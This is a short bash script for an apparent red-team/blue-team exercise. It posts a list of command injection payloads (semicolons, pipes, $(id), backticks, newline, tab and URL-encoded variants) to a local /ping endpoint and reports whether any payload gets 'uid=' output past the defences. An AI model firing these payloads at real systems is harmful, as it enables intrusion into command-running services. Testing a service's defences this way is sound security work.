#!/usr/bin/env bash
# Red team: try multiple command injection bypass techniques
# exit 0 = at least one payload got through (RED WINS)
# exit 1 = all payloads blocked (BLUE WINS)
set -u
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-18080}"
BASE="http://${TARGET_HOST}:${TARGET_PORT}/ping"
SUCCESS=1  # assume blue wins

payloads=(
  # basic
  '127.0.0.1; id'
  '127.0.0.1 && id'
  '127.0.0.1 | id'
  '$(id)'
  '`id`'
  # newline injection
  $'127.0.0.1\nid'
  # URL-encoded semicolon (WAF may not decode)
  '127.0.0.1%3B id'
  # IFS trick
  '127.0.0.1;{id}'
  # tab separator
  $'127.0.0.1\tid'
)

echo "---raw---"
for i in "${!payloads[@]}"; do
  p="${payloads[$i]}"
  resp=$(curl -sS --max-time 4 -X POST "$BASE" --data-urlencode "host=$p" 2>&1) || true
  if echo "$resp" | grep -qE 'uid=[0-9]+\('; then
    echo "PAYLOAD[$i] BYPASSED: ${p:0:60}"
    echo "RESPONSE: $(echo "$resp" | grep -oE 'uid=[0-9]+\([^)]*\)' | head -1)"
    SUCCESS=0
  else
    echo "PAYLOAD[$i] blocked: ${p:0:60}"
  fi
done
echo "---/raw---"

if [ "$SUCCESS" -eq 0 ]; then
  echo "EVIDENCE: at least one command injection payload bypassed defenses"
  exit 0
fi
echo "EVIDENCE: all command injection payloads were blocked"
exit 1
